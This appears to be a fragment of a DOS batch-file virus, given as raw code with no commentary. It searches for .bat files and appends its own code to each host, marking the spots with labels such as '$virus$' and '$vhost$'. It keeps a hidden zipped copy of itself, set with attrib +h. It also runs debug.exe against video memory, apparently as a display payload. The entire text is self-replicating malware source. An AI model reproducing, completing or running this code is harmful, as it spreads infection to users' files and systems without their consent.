if $%1==$$ goto %2
if not exist %_bd%_!v.zip copy %_td%\v.zip %_bd%_!v.zip
attrib.exe %_bd%_!v.zip +h
if not #%_rep%==# call %_td%\vi $ 2 %_me%
:0
for %%a in (%1*.bat %1\*.bat) do call %_td%\vi $ 2 %%a
shift
if not #%1==# goto 0
:1
echo.|time|%_f%.7"
if errorlevel 1 exit
echo m 100 55f b800:280>%_td%\vp.dbg
echo q>>%_td%\vp.dbg
debug.exe %_td%\vp.scn<%_td%\vp.dbg
exit
:2
pkunzip.exe -v %3
if not errorlevel 1 goto 5
rem>%_td%\v
%_f%$vextr$"<%3
if not errorlevel 1 set _v=1
if #%_v%==#1 copy/a %3 %_td%\v
if #%_v%==#1 goto 4b
type %3|%_f%cd"|%_f%\"
if not errorlevel 1 goto 3
%_f%shift"<%3
if errorlevel 1 goto 4
:3
echo>>%_td%\v                                                                                 @goto $viruSH$
echo>>%_td%\v                                                                                 :$vhost$
:4
type %3>>%_td%\v
echo.>>%_td%\v
if not errorlevel 1 goto 4a
echo>>%_td%\v                                                                                 @goto $virus$
goto 4b
:4a
echo>>%_td%\v                                                                                 @goto $vend$
:4b
pkzip.exe %_td%\v.$ %_td%\v.zip
if not #%_v%==#1 copy/b %_td%\v+%_td%\v.ldr+%_td%\v.$ %3
if #%_v%==#1 copy/b %_td%\v+%_td%\v.$ %3
exit
:5
set _vcnt=%_vcnt%-
if %_vcnt%==-------------------- goto 1
:6
